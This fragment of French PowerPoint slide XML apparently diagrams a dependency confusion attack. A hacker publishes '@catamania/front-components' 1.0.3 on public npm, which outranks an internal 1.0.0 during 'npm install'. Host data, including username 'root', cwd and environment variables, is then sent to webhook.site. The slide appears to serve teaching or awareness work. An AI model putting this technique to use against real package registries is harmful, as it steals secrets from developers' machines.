              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t> confusion 2/2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="1025" name="Groupe 1024">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2B837A6F-3262-C12F-0BD9-D1A5B7C62998}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3435000" y="3357096"/>
            <a:ext cx="2160000" cy="1126192"/>
            <a:chOff x="3951920" y="3303931"/>
            <a:chExt cx="2160000" cy="1126192"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="1028" name="Picture 4" descr="Icônes, logos, symboles Server– Téléchargement gratuit aux ...">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{876F0060-0DF4-DBBF-E7D4-C8FBA58FE1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34" t="7259" r="7482" b="7703"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4717594" y="3710749"/>
              <a:ext cx="720000" cy="7187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onatype Nexus - Opsera">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F00A3026-B4FF-7BDC-70E2-55472CE0C0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920" y="3710123"/>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36E649CB-656D-31D6-1498-7668E3DF0CCE}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3951920" y="3303931"/>
              <a:ext cx="2160000" cy="307777"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
                <a:t>https://nexus.appsec.cc</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="63" name="Groupe 62">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3A5CD4EF-D02A-4E46-395D-78C53F978057}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6661362" y="1060003"/>
            <a:ext cx="2160000" cy="1100818"/>
            <a:chOff x="6858000" y="1075593"/>
            <a:chExt cx="2160000" cy="1100818"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="4" name="Picture 4" descr="Icônes, logos, symboles Server– Téléchargement gratuit aux ...">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{923E82DD-FBBC-70FF-19E4-060C824782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34" t="7259" r="7482" b="7703"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="7615760" y="1457037"/>
              <a:ext cx="720000" cy="7187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pm Icon SVG Vector &amp; PNG Free Download | UXWing">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4066A6F1-D11A-D9E4-5186-5285246D2C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1456411"/>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A584D366-BFF9-6C5E-11F2-584FAF290E18}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6858000" y="1075593"/>
              <a:ext cx="2160000" cy="307777"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
                <a:t>https://www.npmjs.com</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="62" name="Groupe 61">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5F82982C-7241-333F-AF77-6D2EF8DD33EB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="9898358" y="1071336"/>
            <a:ext cx="2160000" cy="1099566"/>
            <a:chOff x="9539920" y="1075593"/>
            <a:chExt cx="2160000" cy="1099566"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="10" name="ZoneTexte 9">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3DEF5C0A-C3A7-7149-718D-C1651428EAFC}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="9539920" y="1075593"/>
              <a:ext cx="2160000" cy="307777"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
                <a:t>https://webhook.site</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="15" name="Picture 4" descr="Icônes, logos, symboles Server– Téléchargement gratuit aux ...">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{35FBB23B-B76A-80DE-D84E-973353F98A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34" t="7259" r="7482" b="7703"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="9539920" y="1456411"/>
              <a:ext cx="720000" cy="718748"/>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8" name="Connecteur droit avec flèche 17">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A2EDBCEE-2D9C-730C-AE08-D6FC438B2409}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1343034" y="2590200"/>
            <a:ext cx="5112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ZoneTexte 19">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{800B246E-8CEB-C0F1-C2D5-07294FE8C5B5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2067764" y="2311110"/>
            <a:ext cx="3770540" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:defPPr>
              <a:defRPr lang="fr-FR"/>
            </a:defPPr>
          </a:lstStyle>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>@catamania/front-components-1.0.3</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1038" name="Picture 14">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{01F82CA2-9F6D-BE7A-86CE-C1B49D6EB7C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4509" y="2414385"/>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23" name="ZoneTexte 22">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{597817FC-390C-435E-AA72-15584519ABBB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3465241" y="5034691"/>
            <a:ext cx="1152000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>npm-internal</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="ZoneTexte 23">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E80CC52F-837C-9C29-4B8F-8C6F3393839A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3465241" y="5461949"/>
            <a:ext cx="1152000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>npm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>-proxy</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="ZoneTexte 25">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7F156520-A199-EE1D-81E5-2BA7C2C056BC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="195646" y="5046183"/>
            <a:ext cx="3024000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:defPPr>
              <a:defRPr lang="fr-FR"/>
            </a:defPPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>@catamania/front-components: ~1.0.0</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="27" name="Picture 14">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B904360F-60CB-4302-40ED-074570C3B8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1296" y="5035286"/>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28" name="ZoneTexte 27">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1065AD97-2117-5575-3F1B-FE1A4B60C146}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5025805" y="5075688"/>
            <a:ext cx="612000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>1.0.0</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="ZoneTexte 30">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F6467BEB-8E3D-BFD3-E8E3-2B8EE615383B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7089977" y="2438531"/>
            <a:ext cx="612000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>1.0.3</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="ZoneTexte 31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{70189CF7-AEA1-8BDF-E5B5-147782BBB85D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5028311" y="5454597"/>
            <a:ext cx="612000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>1.0.3</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="33" name="Picture 14">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{01FA9A77-3F71-1367-99A7-8355B3E228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8924" y="5464576"/>
            <a:ext cx="360000" cy="360000"/>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Connecteur droit avec flèche 34">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EE3F70F9-072D-28DE-AE98-925BE56C4A1E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:stCxn id="32" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="5640311" y="2941011"/>
            <a:ext cx="1091173" cy="2667475"/>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Connecteur droit avec flèche 37">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3DE407C8-6D1C-5872-BFBA-7651C781264A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3105480" y="5210424"/>
            <a:ext cx="360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Parenthèse ouvrante 39">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9ABD59C9-1737-87F5-1103-CA6AF464E22B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3466517" y="5065251"/>
            <a:ext cx="95840" cy="72000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cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="42" name="Connecteur droit avec flèche 41">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BE818FC0-B240-8139-3798-CCC3499606B7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="1154577" y="5667933"/>
            <a:ext cx="2268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3" name="Parenthèse fermante 42">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1067B177-7E91-F2EA-9D7E-57254B01F2CC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4492918" y="5065251"/>
            <a:ext cx="95840" cy="72000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44" name="ZoneTexte 43">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8A3E8947-83B8-BA74-1828-CC9FF6244134}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="657937" y="5500884"/>
            <a:ext cx="468000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="36000" rIns="36000">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>1.0.3</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1040" name="Picture 16" descr="Terminal - Icônes panneaux gratuites">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6491682B-40F0-8E3B-2D16-2C6B86F78EF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324" t="14766" r="6324" b="15101"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="195646" y="5494583"/>
            <a:ext cx="360000" cy="289036"/>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Connecteur droit avec flèche 45">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1D394FF6-A41A-69EA-5CE1-39FB28F48E89}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="778651" y="6056779"/>
            <a:ext cx="8856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ZoneTexte 47">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{307D40F0-CA8C-5837-CA17-7EA96ACFEBD3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9827928" y="4704112"/>
            <a:ext cx="2160000" cy="1384995"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>{</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>  "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>hostname</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>": "2023P097",</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>  "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>username</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>": "root",</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>  "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>cwd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>": "/root/dev/...",</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>  "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>env</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>": {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>    "LESSOPEN": "***",</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="ZoneTexte 48">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D7EA9FE6-CC87-EE45-0A63-6741FE8C542E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="597611" y="4735268"/>
            <a:ext cx="1980000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>npm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>install</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="50" name="Picture 16" descr="Terminal - Icônes panneaux gratuites">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{367DB5A8-61D4-83EF-1B6E-4F34646AF25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324" t="14766" r="6324" b="15101"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="195646" y="4744638"/>
            <a:ext cx="360000" cy="28903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6" descr="Terminal - Icônes panneaux gratuites">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8FF32074-E711-6356-2B9A-1AB3A93C28D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324" t="14766" r="6324" b="15101"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="195646" y="2437861"/>
            <a:ext cx="360000" cy="289036"/>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4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{87CD84C3-6852-36E1-6DFE-2688C45397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106" y="2402379"/>
            <a:ext cx="360000" cy="360000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:extLst>
            <a:ext uri="{909E8E84-426E-40DD-AFC4-6F175D3DCCD1}">
              <a14:hiddenFill xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a14:hiddenFill>
            </a:ext>
          </a:extLst>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="1024" name="Groupe 1023">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ED351C59-5AB4-98C1-EF8F-F31440D2C71E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="198005" y="1076966"/>
            <a:ext cx="2160000" cy="1046866"/>
            <a:chOff x="349612" y="1188253"/>
            <a:chExt cx="2160000" cy="1046866"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="1036" name="Picture 12" descr="Crime Hacker Icon SVG Vector &amp; PNG Free Download | UXWing">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1474849A-9E4A-A574-A12A-AE3B4F4A8C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612" y="1557295"/>
              <a:ext cx="720000" cy="6356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Laptop - Free computer icons">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{855C00AB-5124-7AF4-1B7A-E36CB62AAC5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8972" y="1515119"/>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57" name="ZoneTexte 56">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E61FE0AD-46FF-6173-61CA-57C255F44980}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="349612" y="1188253"/>
              <a:ext cx="2160000" cy="307777"/>
            </a:xfrm>
